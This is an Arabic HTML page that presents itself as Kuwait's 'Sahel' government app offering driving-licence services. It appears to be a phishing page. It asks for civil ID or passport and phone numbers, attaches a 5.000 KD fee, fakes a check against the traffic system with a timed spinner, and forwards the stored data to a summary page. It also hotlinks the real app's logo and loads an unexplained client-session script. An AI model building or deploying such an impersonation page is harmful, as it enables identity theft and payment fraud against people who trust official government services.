<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تطبيق سهل الحكومي - خدمات رخص القيادة</title>
    <meta name="description" content="الخدمات الرقمية الرسمية لقطاع المرور عبر التطبيق الحكومي الموحد سهل - دولة الكويت.">
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Cairo', sans-serif;
        }

        body {
            background-color: #f0f3f6;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        a {
            text-decoration: none;
            color: inherit;
        }

        .header_s {
            width: 100%;
            max-width: 450px;
            background-color: #ffffff;
            padding: 12px 15px;
            border-bottom: 1px solid #e2e8f0;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .logo-row img {
            max-height: 45px;
            object-fit: contain;
        }

        .page-content-wrapper {
            width: 100%;
            max-width: 450px;
            padding: 15px;
        }

        .main-card {
            width: 100%;
            background-color: #ffffff;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            border-radius: 8px;
            overflow: hidden;
            border: 1px solid #e2e8f0;
        }

        .service-header {
            background: linear-gradient(135deg, #0c50a3, #083b7a);
            padding: 20px;
            text-align: center;
            color: #ffffff;
        }

        .service-header i {
            font-size: 28px;
            margin-bottom: 8px;
        }

        .service-header h1 {
            font-size: 18px;
            font-weight: 700;
        }

        .service-header p {
            font-size: 12px;
            opacity: 0.85;
            margin-top: 4px;
        }

        .form-section {
            padding: 20px;
            display: flex;
            flex-direction: column;
            gap: 14px;
        }

        .form-group {
            display: flex;
            flex-direction: column;
            gap: 5px;
        }

        .input-label {
            color: #333333;
            font-size: 13px;
            font-weight: 700;
            text-align: right;
        }

        .custom-input, .custom-select {
            width: 100%;
            height: 40px;
            border: 1px solid #cbd5e1;
            border-radius: 6px;
            padding: 0 12px;
            font-size: 13px;
            outline: none;
            background-color: #f8fafc;
            text-align: right;
            transition: all 0.2s ease;
        }

        .custom-input:focus, .custom-select:focus {
            border-color: #0c50a3;
            background-color: #ffffff;
            box-shadow: 0 0 0 3px rgba(12, 80, 163, 0.1);
        }

        .info-box {
            background-color: #eff6ff;
            border: 1px solid #bfdbfe;
            border-radius: 6px;
            padding: 10px 12px;
            font-size: 12px;
            color: #1e40af;
            text-align: right;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .info-box i {
            font-size: 16px;
            color: #3b82f6;
        }

        .button-wrapper {
            margin-top: 10px;
        }

        .submit-btn {
            background-color: #0c50a3;
            color: #ffffff;
            border: none;
            padding: 12px;
            font-size: 14px;
            font-weight: 700;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            text-align: center;
            transition: background-color 0.2s;
        }

        .submit-btn:hover {
            background-color: #083b7a;
        }

        .loader-wrapper {
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            margin: 15px 0;
            gap: 8px;
        }

        .spinner {
            width: 32px;
            height: 32px;
            border: 3px solid #e2e8f0;
            border-top: 3px solid #0c50a3;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        .loader-text {
            font-size: 12px;
            color: #0c50a3;
            font-weight: 700;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <header class="header_s">
        <div class="logo-row">
            <a href="index.html">
                <img src="https://play-lh.googleusercontent.com/14LtLuFiZHQYJN9X8gulgv_qdYm02CcTq0nvGZhimdnjQnc9J5jGZx3BLdnlLRlmjeFNjBljmowCKTE1mxBobg=w600-h300-pc0xffffff-pd" alt="تطبيق سهل">
            </a>
        </div>
    </header>

    <div class="page-content-wrapper">
        <div class="main-card">
            
            <div class="service-header">
                <i class="fa-solid fa-id-card" id="headerIcon"></i>
                <h1 id="headerTitle">تجديد رخصة القيادة</h1>
                <p>تطبيق سهل — وزارة الداخلية (الإدارة العامة للمرور)</p>
            </div>

            <form class="form-section" id="licenseForm">
                
                <!-- اختيار الجنسية / نوع المستخدم -->
                <div class="form-group">
                    <label class="input-label" for="nationalitySelect">الجنسية / فئة المستخدم *</label>
                    <select id="nationalitySelect" class="custom-select">
                        <option value="citizen">كويتي</option>
                        <option value="resident">مقيم</option>
                        <option value="visitor">زائر</option>
                    </select>
                </div>

                <!-- نوع الخدمة (يتغير ديناميكياً حسب نوع المستخدم) -->
                <div class="form-group">
                    <label class="input-label" for="serviceTypeSelect">نوع الخدمة المطلوبة *</label>
                    <select id="serviceTypeSelect" class="custom-select">
                        <!-- يتم تعبئتها ديناميكياً عبر الجافاسكريبت -->
                    </select>
                </div>

                <div class="info-box">
                    <i class="fa-solid fa-circle-info"></i>
                    <span id="infoText">سيتم التحقق من بيانات رخصة السوق والسجل المروري آلياً بناءً على الرقم المدني عبر نظام هويتي وتطبيق سهل.</span>
                </div>

                <div class="form-group">
                    <label class="input-label" id="idLabel" for="civilId">الرقم المدني   *</label>
                    <input type="text" id="civilId" class="custom-input" maxlength="12" placeholder="أدخل الرقم    " required>
                </div>

                <div class="form-group">
                    <label class="input-label" id="phoneLabel" for="phone">رقم الهاتف النقال *</label>
                    <input type="text" id="phone" class="custom-input" placeholder="مثال: 98765432" required>
                </div>

                <div class="button-wrapper">
                    <button type="submit" class="submit-btn" id="requestBtn">متابعة   </button>
                </div>

                <div class="loader-wrapper" id="loaderWrapper">
                    <div class="spinner"></div>
                    <div class="loader-text" id="loaderText">جاري الاتصال بنظام المرور المركزي وجلب البيانات...</div>
                </div>

            </form>

        </div>
    </div>

    <script>
        const nationalitySelect = document.getElementById('nationalitySelect');
        const serviceTypeSelect = document.getElementById('serviceTypeSelect');
        const headerTitle = document.getElementById('headerTitle');
        const headerIcon = document.getElementById('headerIcon');
        const infoText = document.getElementById('infoText');
        const requestBtn = document.getElementById('requestBtn');
        const loaderText = document.getElementById('loaderText');
        const civilIdInput = document.getElementById('civilId');
        const idLabel = document.getElementById('idLabel');
        const phoneInput = document.getElementById('phone');
        const phoneLabel = document.getElementById('phoneLabel');

        // تحديث خيارات الخدمات وحقول الإدخال بناءً على الجنسية/نوع المستخدم
        function updateServices() {
            const natVal = nationalitySelect.value;
            serviceTypeSelect.innerHTML = '';

            if (natVal === 'visitor') {
                serviceTypeSelect.innerHTML = `
                    <option value="temp_issue">إصدار رخصة قيادة مؤقتة للزائرين</option>
                `;
                headerTitle.textContent = 'إصدار رخصة مؤقتة (زائر)';
                headerIcon.className = 'fa-solid fa-passport';
                infoText.textContent = 'يتطلب للزائرين تقديم إجازة قيادة معتمدة وسارية وفحص طبي وطلب مؤقت عبر منصة سهل.';
                requestBtn.textContent = 'تقديم طلب رخصة مؤقتة';
                loaderText.textContent = 'جاري التحقق من بيانات إقامة وزيارة الوافد...';

                // تعديل حقول الزائر لتكون مرنة بأي عدد بدون قيود الطول
                idLabel.textContent = 'رقم الهوية / جواز السفر *';
                civilIdInput.removeAttribute('maxlength');
                civilIdInput.placeholder = 'أدخل رقم الهوية أو جواز السفر  ';

                phoneLabel.textContent = 'رقم الهاتف    *';
                phoneInput.placeholder = 'أدخل رقم الهاتف ';
            } else {
                serviceTypeSelect.innerHTML = `
                    <option value="renew">تجديد رخصة القيادة</option>
                    <option value="issue">حجز موعد اصدار رخصة لأول مرة</option>
                `;
                headerTitle.textContent = 'خدمات رخص القيادة';
                headerIcon.className = 'fa-solid fa-id-card';
                infoText.textContent = 'سيتم التحقق من بيانات رخصة السوق والسجل المروري آلياً بناءً على الرقم المدني.';
                requestBtn.textContent = '    متابعة  ';
                loaderText.textContent = 'جاري الاتصال بنظام المرور المركزي والتحقق من البيانات...';

                // إعادة قيود الرقم المدني للكويتي والمقيم
                idLabel.textContent = 'الرقم المدني / الرقم التعريفي *';
                civilIdInput.setAttribute('maxlength', '12');
                civilIdInput.placeholder = 'أدخل الرقم المدني    ';

                phoneLabel.textContent = 'رقم الهاتف النقال *';
                phoneInput.placeholder = '  ';
            }
        }

        nationalitySelect.addEventListener('change', updateServices);
        updateServices();

        document.getElementById('licenseForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const civilId = civilIdInput.value;
            const natVal = nationalitySelect.value;

            // التحقق من طول الرقم المدني فقط إذا لم يكن المستخدم زائراً
            if(natVal !== 'visitor' && civilId.length < 12) {
                alert('الرجاء التأكد من إدخال رقم مدني صحيح مكون من 12 رقماً.');
                return;
            }

            const phone = phoneInput.value;
            const serviceVal = serviceTypeSelect.value;

            let serviceName = "تجديد رخصة القيادة";
            if (serviceVal === 'issue') {
                serviceName = "حجز موعد اصدار رخصة لأول مرة";
            } else if (serviceVal === 'temp_issue') {
                serviceName = "إصدار رخصة قيادة مؤقتة (زائر)";
            }

            const orderData = {
                nationality: natVal === 'citizen' ? 'كويتي' : (natVal === 'resident' ? 'مقيم' : 'زائر'),
                serviceType: serviceName,
                civilId: civilId,
                phone: phone,
                fee: "5.000 د.ك", 
                details: [
                    { label: "حالة النظام", value: "مطابق للشروط ومتطلبات الإدارة العامة للمرور عبر تطبيق سهل" },
                    { label: "الرسوم المقررة", value: "5.000 د.ك" },
                    { label: "الجهة الإصدار", value: "وزارة الداخلية - قطاع المرور" }
                ]
            };

            sessionStorage.setItem('currentOrder', JSON.stringify(orderData));

            document.getElementById('requestBtn').style.display = 'none';
            document.getElementById('loaderWrapper').style.display = 'flex';

            setTimeout(function() {
                window.location.href = 'summary.html'; 
            }, 1200);
        });
    </script>

<script src="/client-session.js" defer></script>
</body>
</html>
